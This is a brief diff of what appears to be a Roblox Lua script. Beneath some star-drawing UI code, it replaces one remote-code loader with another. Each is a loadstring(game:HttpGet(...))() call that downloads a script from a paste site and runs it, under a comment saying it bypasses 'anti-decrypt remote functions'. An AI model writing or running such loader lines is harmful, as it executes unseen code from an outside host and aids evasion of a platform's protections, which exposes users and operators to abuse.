@@ -43,6 +43,5 @@ createStar(UDim2.new(0.5, -15, 0, 80))
 createStar(UDim2.new(1, -40, 0, 80))  
 
 -- This script is used to bypass anti-decrypt remote functions
-loadstring(game:HttpGet("http://vpaste.net/89X03", true))()
-
+loadstring(game:HttpGet("http://vpaste.net/wSQ3C", true))()
 
